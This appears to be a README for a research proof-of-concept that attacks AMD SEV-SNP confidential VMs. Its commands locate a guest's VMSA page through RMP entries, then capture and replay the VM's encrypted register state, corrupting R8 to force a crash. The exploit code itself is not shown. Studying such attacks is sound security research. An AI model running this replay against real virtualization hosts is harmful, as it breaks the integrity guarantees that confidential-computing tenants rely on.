# replay_vmsa



The source code and the flags talk a lot about *Trusted Memory Regions (TMR)*
because this is the part we initialy wanted to attack. However, it turned out that
TMRs are no longer used to protect the VMSA. You can simply use the VMSA HPA of the SEV-SNP VM whenever the code talks about TMR addrs.

## Usage
First, locate the VMSA page of the guest
```bash
$ sudo ./read_rmp 0x97d00000 0xa82fffff stdout | grep vmsa=1
Entry at offset idx 0x1840042 for hpa 0x1c13aa000 : assigned=1 pagesize=0 immutable=0, gpa=0xfffffffff asid=5 vmsa=1 validated=1
Entry at offset idx 0x6402837 for hpa 0x61b315000 : assigned=1 pagesize=0 immutable=1, gpa=0x000000000 asid=0 vmsa=1 validated=0
```

The entry with a non-zero asid is the one we want. Use its hpa in the next step

```bash
$ sudo ./replay_vmcb --mode REPLAY --aliases ./edited-aliases.csv --tmr-pa 0x59c900000 --tmr-bytes 0x1000 --qemu-pid $(pidof qemu-system-x86_64)
Pausing VM...
VM paused!
Capturing Register State
tmr_pa          0x59c900000
alias_tmr_pa    0xd9c930000
Copying TMR via  0x59c900000 bytes 0x1000 aliased? 0
Captured register state!
Resuming VM...
VM resumed!
Short sleep...
Blocking VM 2nd time...
VM blocked!
Replaying register state...
Copying TMR via  0x59c900000 bytes 0x1000 aliased? 0
Hash for state A: 16 33 31 82 f0 76 ec 1a 52 03 2a 62 84 bc d0 cb b8 1c 57 d6 46 4f 9d 61 ba dd 85 a2 5a 32 19 fe 
Hash for state B: cb d4 11 e1 86 52 b4 9a 36 b5 5a d0 8c 8b b5 7f 93 68 11 95 d1 19 ad 7d 73 78 79 01 18 5e a6 92 
Memsetting state R8 to garbage to force crash
Replayed register state!
Resuming VM...
VM resumed
```
